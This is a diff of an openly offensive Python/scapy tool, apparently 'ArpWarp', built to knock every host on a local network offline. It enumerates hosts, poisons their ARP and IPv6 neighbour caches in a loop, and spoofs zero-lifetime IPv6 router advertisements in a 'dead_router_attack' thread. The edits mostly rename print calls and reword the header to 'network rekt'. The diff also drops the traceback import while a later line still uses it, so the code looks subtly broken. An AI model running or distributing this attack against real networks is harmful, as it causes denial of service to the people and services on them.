@@ -1,19 +1,15 @@
 #!/usr/bin/env python3
 
-import traceback
 import ipaddress
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings
 
 from scapy.all import *
 from utils import *
-
 conf.verb = 0
-
 #   --------------------------------------------------------------------------------------------------------------------
 #
-#   Arp Warp attack - Continuously poison the ARP + ND cache of all hosts on the connected network
-#   to make it unresponsive
+#   ArpWarp attack -> network rekt
 #
 #   Ⓒ by https://github.com/flashnuke Ⓒ
 #
@@ -52,30 +48,30 @@ class ArpWarp:
 
         self.host_ipv4s = [str(host_ip) for host_ip in ipaddress.IPv4Network(self.subnet_ipv4_sr) if
                            str(host_ip) != self.my_private_ip and str(host_ip) != self.gateway_ipv4]
-        print(f"[*] Generated {len(self.host_ipv4s)} possible IPV4 hosts")
+        printf(f"[*] Generated {len(self.host_ipv4s)} possible IPV4 hosts")
         if self.spoof_ipv6ra:
-            print(f"[*] IPv6 RA spoof is enabled, setting up...")
+            printf(f"[*] IPv6 RA spoof is enabled, setting up...")
             self.host_ipv6s = list()
             if not os_is_windows():
-                print("[*] Pinging IPv6 subnet for hosts...")
+                printf("[*] Pinging IPv6 subnet for hosts...")
                 self.host_ipv6s = self.get_all_hosts_ipv6()
-                print(f"[+] Found {len(self.host_ipv6s)} IPv6 hosts during setup")
+                printf(f"[+] Found {len(self.host_ipv6s)} IPv6 hosts during setup")
             else:
-                print("[-] Windows does not support ping6, skipping...")
+                printf("[-] Windows does not support ping6, skipping...")
         else:
-            print(f"[-] IPv6 RA spoof is disabled, skipping ping6...")
+            printf(f"[-] IPv6 RA spoof is disabled, skipping ping6...")
 
         self.abort = False
 
     def print_settings(self):
-        print("- net iface" + self.network_interface.rjust(38))
-        print("- sleep time" + str(self.arp_poison_interval).rjust(32) + "[sec]")
-        print("- IPv4 subnet" + self.subnet_ipv4_sr.rjust(36))
-        print("- IPv4 gateway" + self.gateway_ipv4.rjust(35))
-        print("- IPv6 gateway" + self.gateway_ipv6.rjust(35))
-        print("- IPv6 preflen" + str(self.ipv6_preflen).rjust(35))
-        print("- spoof IPv6 RA" + str(self.spoof_ipv6ra).rjust(34))
-        print(DELIM)
+        printf("- net iface" + self.network_interface.rjust(38))
+        printf("- sleep time" + str(self.arp_poison_interval).rjust(32) + "[sec]")
+        printf("- IPv4 subnet" + self.subnet_ipv4_sr.rjust(36))
+        printf("- IPv4 gateway" + self.gateway_ipv4.rjust(35))
+        printf("- IPv6 gateway" + self.gateway_ipv6.rjust(35))
+        printf("- IPv6 preflen" + str(self.ipv6_preflen).rjust(35))
+        printf("- spoof IPv6 RA" + str(self.spoof_ipv6ra).rjust(34))
+        printf(DELIM)
 
     def get_all_hosts_ipv6(self) -> List[str]:
         ipv6_hosts = list()
@@ -120,7 +116,7 @@ class ArpWarp:
                         ICMPv6NDOptPrefixInfo(prefixlen=self.ipv6_preflen, prefix=f"{IPV6_LL_PREF}::")
         sendp(spoofed_mc_ra)
     
-    def kill_router_attack(self):
+    def dead_router_attack(self):
         """
         * Monitor RA messages and immediately send fake zero-lifetime RA packets
         """
@@ -128,12 +124,12 @@ class ArpWarp:
 
     def start_attack(self):
         loop_count = 0
-        print(DELIM)
+        printf(DELIM)
         if os_is_linux():
-            print("")
-            print("")
+            printf("")
+            printf("")
         if self.spoof_ipv6ra:
-            threading.Thread(target=self.kill_router_attack, daemon=True).start()
+            threading.Thread(target=self.dead_router_attack, daemon=True).start()
         while not self.abort:
             try:
                 loop_count += 1
@@ -142,17 +138,17 @@ class ArpWarp:
                 if self.spoof_ipv6ra:
                     self.poison_ra()
                 if os_is_linux():
-                    print(2 * "\x1b[1A\x1b[2K")
-                print(f"[+] attacking..." + f"cycle #{str(loop_count)} duration {get_ts_ms() - now}[ms]".rjust(33))
+                    printf(2 * "\x1b[1A\x1b[2K")
+                printf(f"[+] attacking..." + f"cycle #{str(loop_count)} duration {get_ts_ms() - now}[ms]".rjust(33))
                 time.sleep(self.arp_poison_interval)
             except Exception as exc:
-                print(DELIM)
-                print(f"[!] Exception caught -> {exc}")
-                print(traceback.format_exc())
+                printf(DELIM)
+                printf(f"[!] Exception caught -> {exc}")
+                printf(traceback.format_exc())
                 self.abort = True
             except KeyboardInterrupt:
-                print(DELIM)
-                print(f"[-] User requested to stop...")
+                printf(DELIM)
+                printf(f"[-] User requested to stop...")
                 self.abort = True
 
     @staticmethod
@@ -164,8 +160,8 @@ class ArpWarp:
 
 
 if __name__ == "__main__":
-    print(f"\n{BANNER}\nWritten by @flashnuke")
-    print(DELIM)
+    printf(f"\n{BANNER}\nWritten by @flashnuke")
+    printf(DELIM)
 
     arguments = define_args()
     warper = ArpWarp(arguments.iface, arguments.cidrlen, arguments.s_time, arguments.gateway,
